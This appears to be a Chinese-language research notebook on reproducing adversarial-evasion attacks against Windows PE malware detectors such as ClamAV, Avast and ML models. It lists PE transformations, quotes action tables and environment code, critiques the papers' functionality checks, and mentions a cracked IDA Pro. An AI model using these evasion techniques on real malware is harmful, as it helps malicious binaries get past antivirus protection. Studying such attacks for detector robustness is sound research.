<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.05.50.png" alt="截屏2024-07-23 15.05.50"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.05.58.png" alt="截屏2024-07-23 15.05.58"></p>
<p><strong>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</strong></p>
<ul>
<li><p>❗️源代码中显示攻击的<code>detection</code>为<code>ember</code>、<code>sorel</code>、<code>malconv。</code></p>
</li>
<li><p>❗️源代码中并没有实现对对抗性样本的<code>Format Preservation</code>、<code>Executability Preservation</code>、<code>Maliciousness Preservation</code>的验证。</p>
</li>
<li><p>❗️虽然是基于<code>gym</code>提供的强化学习的框架，但是实际的动作选择是随机的。</p>
<blockquote>
<p><em><code>RandomAgent</code> 仅仅是一个随机选择动作的简单代理，它在每次需要选择动作时，都从动作空间中随机采样。这个过程不涉及任何学习或策略优化，因此不属于强化学习的范畴。</em></p>
</blockquote>
</li>
<li><p><code>Transformation</code>的具体<code>action</code>如下</p>
<ol>
<li><code>modify_machine_type</code></li>
<li><code>pad_overlay</code></li>
<li><code>append_benign_data_overlay</code></li>
<li><code>append_benign_binary_overlay</code></li>
<li><code>add_bytes_to_section_cave</code></li>
<li><code>add_section_strings</code></li>
<li><code>add_section_benign_data</code></li>
<li><code>add_strings_to_overlay</code></li>
<li><code>add_imports</code></li>
<li><code>rename_section</code></li>
<li><code>remove_debug</code></li>
<li><code>modify_optional_header</code></li>
<li><code>modify_timestamp</code></li>
<li><code>break_optional_header_checksum</code></li>
<li><code>upx_unpack</code></li>
<li><code>upx_pack</code></li>
</ol>
</li>
</ul>
<p><strong>代码的整体逻辑</strong></p>
<ul>
<li><code>random_agent.py:</code>是主函数，使用gym提供的强化学习方法实现攻击，总计250次训练回合</li>
<li><code>malware/env</code>中实现了强化学习中的各种环境</li>
<li><code>malware/env/utils</code>中检测器模型和文件接口</li>
<li><code>malware/env/controls/modifier.py</code>中是对二进制文件的修改操作</li>
</ul>
<p>完成的部分：</p>
<ul>
<li>阅读完源码</li>
<li>已经把源代码跑起来了</li>
<li>添加了对ClamAV的攻击</li>
</ul>
<p><strong>出现的问题：</strong></p>
<ul>
<li><p>❗️<strong>获取不了<code>sorel</code>模型</strong>：因为需要亚马逊账号，但注册亚马逊账号需要一张VISA卡。</p>
</li>
<li><p>❗️<strong>源码逃逸率的计算很奇怪，并不是 逃逸的样本数量 &#x2F; 总样本数量</strong></p>
</li>
<li><p>❗️<strong>源码接受的病毒样本大小最大为1MB</strong></p>
</li>
<li><p>❗️**<code>lief</code>库无法处理大小超过<code>1073741824 bytes</code>的section**：这个问题目前来说是无法解决的，因为要修改第三方库</p>
<blockquote>
<p><em>某些PE样本在被LIEF解析时返回错误，因为该库不使用任何反汇编器，导致在导入地址表上实现的LEA指令导入过程中出现损坏。为了解决这个问题，需要进行初步过滤，以隔离正确解析的功能性样本。并不是所有生成的变种都是有效的，因为扰动可能会使文件损坏。我们的实验表明，通常需要创建至少两倍于预期有效文件数量的变种。</em></p>
</blockquote>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Sample: d33e6b41a890d73d656e2bdd0663a9d28c75226796a069b861f63afe790d4ee2</span><br><span class="line">DEBUG clamav_gym FUNC step</span><br><span class="line">DEBUG clamav_gym FUNC _take_action</span><br><span class="line">DEBUG modifier FUNC modify_sample, action modify_machine_type</span><br><span class="line">DEBUG modifier FUNC modify_machine_type</span><br><span class="line">The padding size of section <span class="string">&#x27;.pdata&#x27;</span> is huge. Only the first 1073741824 bytes will be taken into account</span><br><span class="line">Can<span class="string">&#x27;t read the padding content of section &#x27;</span>.pdata<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Section #4 (��) is corrupted</span></span><br><span class="line"><span class="string">The padding size of section &#x27;</span>��<span class="string">&#x27; is huge. Only the first 1073741824 bytes will be taken into account</span></span><br><span class="line"><span class="string">Can&#x27;</span>t <span class="built_in">read</span> the padding content of section <span class="string">&#x27;��&#x27;</span></span><br><span class="line">     parse ok</span><br><span class="line"></span><br><span class="line">output <span class="keyword">done</span></span><br><span class="line">Killed</span><br></pre></td></tr></table></figure>

<h3 id="5-2-ARMED-实验复现"><a href="#5-2-ARMED-实验复现" class="headerlink" title="5.2 ARMED 实验复现"></a>5.2 ARMED 实验复现</h3><p>我对代码的修改：</p>
<ol>
<li>修改了原代码中不合理的部分，新增<code>armed_fix</code>环境作为测试代码</li>
<li>搭建了sanbox平台，对<code>IntegerityCheck</code>做出新的定义：report中<code>signatures</code>字段相同</li>
<li>增加了<code>avast</code>、<code>clamav</code>检测，统一了<code>ember</code>模型为<code>ember_2018.txt</code></li>
<li></li>
</ol>
<h4 id="ARMED的finding"><a href="#ARMED的finding" class="headerlink" title="ARMED的finding:"></a>ARMED的finding:</h4><p>评估显示，与原始样本S的检测相比，随机二进制级别的修改使得变种S’的恶意软件引擎检测率降低了最多80%。生成功能性变种在很大程度上取决于随机注入的扰动的具体顺序。我们的实验表明，平均约18%的变种是功能性的且未被破坏。</p>
<ol>
<li><p>测试样本生成的有效性验证：</p>
<ul>
<li>某些PE样本在通过LIEF解析时会返回错误，这是因为该库在导入LEA指令期间没有使用反汇编器，导致导入地址表损坏。</li>
<li>通常需要生成至少两倍于预期有效文件数量的变种 。</li>
</ul>
</li>
<li><p>检测率评估：使用VirusTotal平台评估了ARMED生成新的变种样本的检测率。❗️</p>
<ul>
<li><p>注入少量扰动就可以显著降低新变种的检测率：只注入五个扰动，也能使变种的检测率显著下降，反而更长的扰动不一定有效</p>
</li>
<li><p>在注入扰动后的几天内，大多数引擎开始检测到新变种，表明新的变种上传后，检测引擎会调整其检测策略 。</p>
<blockquote>
<p>❗️<em>argue</em></p>
<p><em>使用 VirusTotal 进行杀毒软件比较分析的人应当知道，他们在方法论上犯了许多隐含的错误，其中最明显的错误包括：</em></p>
<ol>
<li><em><strong>命令行版本的差异</strong>：VirusTotal 的杀毒引擎是命令行版本，因此根据产品的不同，它们的行为可能与桌面版本不完全相同。例如，桌面解决方案可能使用基于行为分析的技术，并配有个人防火墙，这些都会减少入口点并缓解传播等问题。</em></li>
<li><em><strong>桌面和外围解决方案的共存</strong>：在 VirusTotal 中，面向桌面的解决方案与面向外围的解决方案共存；后者的启发式算法可能更具攻击性和偏执，因为在外围环境中，误报的影响不太明显。因此，将这两类解决方案进行比较是不公平的。</em></li>
<li><em><strong>不同的启发式&#x2F;攻击性参数</strong>：VirusTotal 中的一些解决方案根据开发公司意愿被配置了与官方终端用户默认配置不同的启发式&#x2F;攻击性级别。</em></li>
</ol>
</blockquote>
</li>
</ul>
</li>
<li><p>序列结构评估：</p>
<ul>
<li><p>特定数量的扰动比其他数量更能有效降低检测率，表明扰动序列的顺序可能比序列长度更为重要 。</p>
</li>
<li><p>注入较少扰动的序列在某些情况下会导致较高的检测率，这可能是因为这些变种与原始样本非常相似，检测引擎能够更好地调整其检测 。❗️</p>
<blockquote>
<p><em>❗️argue，没有回答检测引擎是通过什么来判断它们的相似性并调整检测的？</em></p>
<p><em>哈希狩猎</em></p>
</blockquote>
</li>
</ul>
</li>
<li><p>处理时间评估：</p>
<ul>
<li>创建变种平均需要5分钟；使用第三方分类器对时间的影响较大。</li>
</ul>
</li>
<li><p>局限性：</p>
<ul>
<li><strong>序列长度与哈希冲突</strong>：当注入的扰动序列长度为1或2时，许多变种最终会与原始样本S重复，导致两者的加密哈希值相同。</li>
<li><strong>安全层的影响</strong>：尽管生成的变种S’检测率较低，但安全层（如防火墙配置）仍然可以帮助防止感染。例如，如果S’是由恶意软件下拉器或下载器生成的，这些下拉或投放的有效载荷可以被检测到，或者新的样本可能已经为恶意软件引擎所知。</li>
<li><strong>综合规避策略</strong>：ARMED框架可以应用于不同类型的恶意软件样本（如下拉器、下载器和有效载荷），并结合额外的规避层（如打包器）来提高逃避率。这表明，仅依靠单一方法可能不足以完全逃避检测，需要综合使用多种技术来提高成功率。</li>
</ul>
</li>
</ol>
<h4 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h4><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00.png" alt="截屏2024-07-23 15.38.00"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.27.png" alt="截屏2024-07-23 15.38.27"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><ul>
<li><p><code>Transformation</code>的操作</p>
<blockquote>
<p><em>发现FAME仓库里对malware的manipulation与gym-malware（现在新仓库为malware_rl）相同，<code>FAME/data/manipulate.py</code></em></p>
<p>❗️**<code>imports_append</code>和<code>create_entry</code>未被使用，因为实验表明它们可能无法正确修补样本，并且很可能由于入口点错误而创建损坏的文件。**</p>
<p>❓但是源代码中有<code>imports_append</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># List of actions</span></span><br><span class="line">ACTION_TABLE = &#123;</span><br><span class="line">    <span class="string">&#x27;overlay_append&#x27;</span>: <span class="string">&#x27;overlay_append&#x27;</span>,     <span class="comment"># 0</span></span><br><span class="line">    <span class="string">&#x27;imports_append&#x27;</span>: <span class="string">&#x27;imports_append&#x27;</span>,     <span class="comment"># 1</span></span><br><span class="line">    <span class="string">&#x27;section_rename&#x27;</span>: <span class="string">&#x27;section_rename&#x27;</span>,     <span class="comment"># 2</span></span><br><span class="line">    <span class="string">&#x27;section_add&#x27;</span>: <span class="string">&#x27;section_add&#x27;</span>,           <span class="comment"># 3</span></span><br><span class="line">    <span class="string">&#x27;section_append&#x27;</span>: <span class="string">&#x27;section_append&#x27;</span>,     <span class="comment"># 4</span></span><br><span class="line">    <span class="string">&#x27;remove_signature&#x27;</span>: <span class="string">&#x27;remove_signature&#x27;</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="string">&#x27;remove_debug&#x27;</span>: <span class="string">&#x27;remove_debug&#x27;</span>,         <span class="comment"># 6</span></span><br><span class="line">    <span class="string">&#x27;upx_pack&#x27;</span>: <span class="string">&#x27;upx_pack&#x27;</span>,                 <span class="comment"># 7</span></span><br><span class="line">    <span class="string">&#x27;upx_unpack&#x27;</span>: <span class="string">&#x27;upx_unpack&#x27;</span>,             <span class="comment"># 8</span></span><br><span class="line">    <span class="string">&#x27;break_optional_header_checksum&#x27;</span>: <span class="string">&#x27;break_optional_header_checksum&#x27;</span>  <span class="comment"># 9</span></span><br><span class="line"><span class="comment">#   &#x27;create_new_entry&#x27;: &#x27;create_new_entry&#x27;, # generates often entry point errors</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<ol>
<li><code>overlay_append</code></li>
<li><code>imports_append</code></li>
<li><code>section_rename</code></li>
<li><code>section_add</code></li>
<li><code>section_append</code></li>
<li><code>remove_signature</code></li>
<li><code>remove_debug</code></li>
<li><code>upx_pack</code></li>
<li><code>upx_unpack</code></li>
<li><code>break_optional_header_checksum</code></li>
</ol>
</li>
<li><p>❗️<code>functionality</code>的检测方法不具备说服力</p>
<ol>
<li>函数<code>malware_analysis</code>：样本在沙盒中运行时间超过<code>15s</code>且报告中没有<code>err</code>，则为<code>functionality</code></li>
<li>函数<code>malware_analysis_HA</code>：样本报告中含有<code>domains</code>或<code>compromised_hosts</code>，则为<code>functionality</code></li>
</ol>
</li>
</ul>
<h3 id="5-3-AIMED-实验复现"><a href="#5-3-AIMED-实验复现" class="headerlink" title="5.3 AIMED 实验复现"></a>5.3 AIMED 实验复现</h3><h4 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-1"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-1" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h4><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-1813762.png" alt="截屏2024-07-23 15.38.00"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-24%2017.35.49.png" alt="截屏2024-07-24 17.35.49"></p>
<ul>
<li><p><code>AIMED</code>攻击的检测器：<code>GBDT (static)</code>、<code>Sophos</code>、<code>ESET</code>和<code>Kaspersky</code></p>
<blockquote>
<p>所有扫描器都使用默认配置的静态检测进行测试，版本如下：Kaspersky 19、ESET NOD32 Antivirus 11和Sophos Endpoint Security 10.8，并在实验进行时保持最新。</p>
</blockquote>
</li>
<li></li>
</ul>
<h3 id="5-4-Shallow-Security-on-the-Creation-of-Adversarial-Variants-to-Evade-Machine-Learning-Based-Malware-Detectors-实验复现"><a href="#5-4-Shallow-Security-on-the-Creation-of-Adversarial-Variants-to-Evade-Machine-Learning-Based-Malware-Detectors-实验复现" class="headerlink" title="5.4 Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors 实验复现"></a>5.4 Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors 实验复现</h3><p>❓这个源码太复杂，晚点来看</p>
<h4 id="Shallow-Security的findings-amp-contribution"><a href="#Shallow-Security的findings-amp-contribution" class="headerlink" title="Shallow Security的findings &amp; contribution"></a>Shallow Security的findings &amp; contribution</h4><ul>
<li><p>基于原始二进制数据的ML模型可以通过在二进制文件中追加数据来绕过。</p>
</li>
<li><p>基于频率的ML模型可以通过在恶意软件二进制文件中嵌入良性字符串来绕过。</p>
</li>
<li><p>了解PE格式的分类器可能更倾向于检测打包器，而不是实际学习恶意二进制文件的概念。</p>
<p>提出了三种方法来缓解我们发现的缺点：</p>
<ol>
<li>操作系统加载器在加载文件时应更关注二进制不一致性，以避免加载由二进制数据插入产生的格式错误的二进制文件。</li>
<li>ML模型应更关注恶意特征的存在，而不是其频率，以更能抵抗数据追加。</li>
<li>我们主张在评估未来提出的基于ML的恶意软件检测器时，应考虑恶意软件变体的鲁棒性。</li>
</ol>
</li>
</ul>
<p>贡献如下：</p>
<ol>
<li>我们描述了参与对基于ML的恶意软件检测器进行对抗性攻击挑战的经历。</li>
<li>我们描述了在实验中发现的模型弱点。</li>
<li>我们提出了未来基于ML的恶意软件检测研究的措施。</li>
</ol>
<ul>
<li><p>附加数据的脆弱性</p>
</li>
<li><p>对抗性恶意软件体积大</p>
</li>
<li><p>基于特征存在而非频率开发模型</p>
</li>
<li><p>域特定模型的偏见</p>
</li>
<li><p>采用恶意软件变体的稳健性作为评估标准：为了提升恶意软件检测的实际效果，应该在评估机器学习检测器时，加入对恶意软件变体的稳健性测试，即使是深度学习模型也可能被绕过，因此需要更全面的评估标准。</p>
</li>
<li><p>创建稳健表示：要开发不受良性软件特征影响的检测方法，以防止恶意软件通过添加良性特征来绕过检测，同时还应检查文件资源和嵌入的PE文件，以识别隐藏的恶意内容。</p>
</li>
<li><p>转换样本为下载器</p>
</li>
<li><p>生成对抗性样本</p>
</li>
</ul>
<h4 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-2"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-2" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h4><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3083355.png" alt="截屏2024-07-23 15.38.00"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-08%2010.17.22.png" alt="截屏2024-08-08 10.17.22"></p>
<h3 id="5-5-Malware-Makeover-Breaking-ML-based-Static-Analysis-by-Modifying-Executable-Bytes-实验复现"><a href="#5-5-Malware-Makeover-Breaking-ML-based-Static-Analysis-by-Modifying-Executable-Bytes-实验复现" class="headerlink" title="5.5 Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes 实验复现"></a>5.5 Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes 实验复现</h3><h4 id="记录一下复现过程"><a href="#记录一下复现过程" class="headerlink" title="记录一下复现过程"></a>记录一下复现过程</h4><p>环境：ubuntu22.04 conda 32位python ida pro 6.4破解版</p>
<p>这个是可以运行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /home/parallels/estimation_on_attacker/IDA_Pro_v6.4_\(Linux\)_and_Hex-Rays_Decompiler_\(ARM\)/IDA_Pro_v6.4_\(Linux\)_and_Hex-Rays_Decompiler_\(ARM\)/idal -A -S/home/parallels/estimation_on_attacker/attackers/binary-transform/enhanced-binary-randomization/orp/inp_ida.py example/caffeine.exe</span><br></pre></td></tr></table></figure>



<h4 id="就地随机化（In-Place-Randomization，IPR）的转换类型-71-。"><a href="#就地随机化（In-Place-Randomization，IPR）的转换类型-71-。" class="headerlink" title="就地随机化（In-Place Randomization，IPR）的转换类型 [71]。"></a>就地随机化（In-Place Randomization，IPR）的转换类型 [71]。</h4><p>对于一个需要随机化的二进制文件，Pappas 等人提出了对其进行反汇编，识别函数和基本块，静态执行四种保持功能性的转换类型，然后根据修改后的汇编代码更新二进制文件。这四种转换类型分别是：</p>
<ol>
<li>使用等长的等效指令替换现有指令（例如，<code>sub eax,4 → add eax,-4</code>）。</li>
<li>在函数或基本块集合内重新分配寄存器（例如，交换所有 <code>ebx</code> 和 <code>ecx</code> 的实例），前提是这不会影响后续的代码。</li>
<li>使用依赖图重新排序指令，以确保不会在依赖于某指令的指令之前出现该指令。</li>
<li>改变寄存器值在栈中的推入和弹出顺序，以确保它们在函数调用过程中被保存。</li>
</ol>
<p>从两个方面比较了攻击的总体成功率：</p>
<ul>
<li>一是被误分类的二进制文件在10次重复攻击中至少一次成功的百分比（覆盖率）；</li>
<li>二是所有被攻击的二进制文件中攻击成功的总体百分比（效力）。</li>
</ul>
<p>操作<code>manipulations</code>，来自<code>binary_transform.py</code></p>
<ul>
<li>等效指令替换</li>
<li>寄存器交换</li>
<li>寄存器保留</li>
<li>指令重排</li>
<li>代码块位移</li>
<li>语义空操作</li>
</ul>
<p><strong>仓库只提供了一个简单的binary_transform.py，并没有给出完整的攻击框架，因此这篇论文的复现难度较高</strong>❗️</p>
<p>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3083355.png" alt="截屏2024-07-23 15.38.00"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-09%2015.19.45.png" alt="截屏2024-08-09 15.19.45"></p>
<ul>
<li>论文中对reservaton的检测是举例检测，而非在攻击框架中检测，并且在<code>test-correctness.py</code>中并没有实现自动化功能性验证</li>
</ul>
<blockquote>
<p>思考，对于只返回0和1的问题来说，如何设置爬山算法呢</p>
</blockquote>
<h3 id="5-6-MAB-Malware-实验复现"><a href="#5-6-MAB-Malware-实验复现" class="headerlink" title="5.6 MAB-Malware 实验复现"></a>5.6 MAB-Malware 实验复现</h3><ul>
<li><p><code>arm.py</code>中的<code>class ArmCR</code>并没有实现代码随机化</p>
</li>
<li><p><strong>判断修改后的样本维持功能性的条件：</strong></p>
<p>cuckoo沙盒返回的签名：<code>检测到加密行为 || 原始签名列表中未找到相同签名的数量少于或等于1 ||相似率大于等于 80%</code></p>
</li>
<li><p><strong>逃逸率 :&#x3D; 逃逸样本数量 &#x2F; 总样本数量</strong></p>
</li>
</ul>
<h3 id="5-7-Functionality-Preserving-Black-Box-Optimization-of-Adversarial-Windows-Malware-实验复现"><a href="#5-7-Functionality-Preserving-Black-Box-Optimization-of-Adversarial-Windows-Malware-实验复现" class="headerlink" title="5.7 Functionality-Preserving Black-Box Optimization of Adversarial Windows Malware 实验复现"></a>5.7 Functionality-Preserving Black-Box Optimization of Adversarial Windows Malware 实验复现</h3><p>为什么会发现这些缺点：</p>
<ul>
<li>查询效率低，因为它们依赖于对输入的恶意软件进行随机变换的迭代应用；</li>
<li>它们还可能需要在优化过程的每次迭代中，在沙箱中执行对抗性恶意软件，以确保其入侵功能得到保留。</li>
</ul>
<p>操作：</p>
<ul>
<li>从良性软件中提取内容而非随机生成。</li>
<li>计算目标惩罚是按照修改后文件大小的变化惩罚</li>
</ul>
<p>怀疑实验效果并没有论文中所述的这么好。</p>
<p>代码结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CGammaSectionsEvasionProblem &lt;= 继承自 = CGammaEvasionProblem &lt;= 继承自 = CBlackBoxProblem</span><br><span class="line"></span><br><span class="line">CGammaSectionsEvasionProblem 实现 section injection，等价于section add 将新的节注入到样本中</span><br><span class="line"></span><br><span class="line">CGammaEvasionProblem 实现的 padding 等价于 overlay_append，将内容附加在样本末尾</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGeneticAlgorithm &lt;= 继承自 = CAttackEvasion</span><br></pre></td></tr></table></figure>

<ul>
<li>要继承第三方病毒查杀，需要将代码嵌入<code>c_base_genetic_engine.py</code> 中的<code>run</code>函数</li>
</ul>
<h4 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-3"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-3" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h4><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3608424.png" alt="截屏2024-07-23 15.38.00"></p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-14%2012.07.42.png" alt="截屏2024-08-14 12.07.42"></p>
<ul>
<li>没想明白为什么这篇论文能ccf a</li>
</ul>
<h3 id="Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection"><a href="#Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection" class="headerlink" title="Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection"></a>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</h3><p>这个就是把之前提的东西整理一遍，但没有加入商用软件的接口</p>
<h3 id="MalwareTotal-实验复现"><a href="#MalwareTotal-实验复现" class="headerlink" title="MalwareTotal 实验复现"></a>MalwareTotal 实验复现</h3><h4 id="评估性能的关键指标"><a href="#评估性能的关键指标" class="headerlink" title="评估性能的关键指标"></a>评估性能的关键指标</h4><ol>
<li>攻击成功率（ASR）</li>
<li>查询预算（Q）查询预算表示在生成过程中调用杀毒软件检测器的总次数</li>
<li>规避成本（𝛼）：定义为 对抗性样本的文件大小不超过原文件的1+𝛼倍，规避成本是修改后恶意软件大小的平均值，表示在生成过程中注入了多少字节</li>
<li>时间消耗（T）</li>
<li>功能性</li>
</ol>
<h4 id="代码中需要补充的地方："><a href="#代码中需要补充的地方：" class="headerlink" title="代码中需要补充的地方："></a>代码中需要补充的地方：</h4><p>统计哪个操作是关键操作</p>
<p>创新之处：</p>
<ul>
<li>与其他规避攻击不同，MalwareTotal专注于直接优化最小操作序列，而不是优化最小注入。这是因为恶意软件变异的顺序特性。</li>
<li>MalwareTotal简单易用，适用于实际场景，因为它是一种查询高效的规避攻击，仅需要黑盒恶意软件检测器提供的硬标签。</li>
</ul>
<p>变异操作：</p>
<ul>
<li>Header manipulation</li>
<li>Section manipulation</li>
<li>Overlay manipulation</li>
<li>Compound manipulation</li>
</ul>
<p>对于维持功能性的检查：比较cuckoo返回的签名，如果相同则证明保持了功能性</p>
<p>❗️发现在代码中，达到最大轮次后会执行一个加密操作</p>
<blockquote>
<p>在初始训练阶段，模型不断选择操作23，而不是设计出有效的操作序列。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行动作并检查样本是否被跳过</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_take_action</span>(<span class="params">self, action_ix</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		bin_size = sys.getsizeof(self.bytez)/<span class="number">1048576</span> <span class="comment"># 1024**2</span></span><br><span class="line">		<span class="keyword">if</span>  bin_size &gt;= self.max_file_size:</span><br><span class="line">			crash_prompt(<span class="string">f&#x27;In taking actions, file size is larger than the max_file_size, thereby skipped&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span>  <span class="literal">True</span>  </span><br><span class="line">		<span class="keyword">try</span> :</span><br><span class="line">			binary = pefile.PE(self.file_path)</span><br><span class="line">			is_skipped = <span class="literal">False</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">			crash_prompt(<span class="string">f&#x27;in parsing pe... &#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span>  <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> is_skipped :</span><br><span class="line">	</span><br><span class="line">			action = ACTION_LOOKUP[action_ix]</span><br><span class="line">			<span class="comment"># action = &quot;add_imports&quot;</span></span><br><span class="line"></span><br><span class="line">			self.curr_action = action</span><br><span class="line">			<span class="comment"># crash_prompt(f&#x27;taking action name:  &#123;action&#125;&#x27;)</span></span><br><span class="line">			self.history[self.sha256][<span class="string">&quot;actions&quot;</span>].append(action)</span><br><span class="line">			<span class="keyword">try</span> :</span><br><span class="line">				self.bytez, is_skipped = mt_action.modify_sample(self.bytez, action, self.sha256, self.pe, self.file_path)</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">				crash_prompt(<span class="string">f&#x27;Exception in _take_action <span class="subst">&#123;self.curr_action&#125;</span>&#x27;</span>)</span><br><span class="line">				<span class="comment"># crash_prompt(f&#x27;&#x27;)</span></span><br><span class="line">				crash_prompt(<span class="string">f&#x27;Error is : <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">				<span class="keyword">return</span>  <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> self.turns == self.maxturns  : ❗️❗️❗️❗️❗️❗️</span><br><span class="line">				action = <span class="string">&quot;obsi_pack&quot;</span></span><br><span class="line">				<span class="keyword">try</span> :</span><br><span class="line">					<span class="comment"># 执行修改操作，并返回修改后的样本和是否跳过的标志</span></span><br><span class="line">					self.bytez, is_skipped = mt_action.modify_sample(self.bytez, action, self.sha256, self.pe, self.file_path)</span><br><span class="line">				<span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">					<span class="comment"># crash_prompt(f&#x27;Exception in _take_action obsi_pack: &#123;e&#125;&#x27;)</span></span><br><span class="line">					crash_prompt(<span class="string">f&#x27;Exception in _take_action obsi_pack:&#x27;</span>)</span><br><span class="line">					<span class="keyword">return</span>  <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> is_skipped</span><br><span class="line">		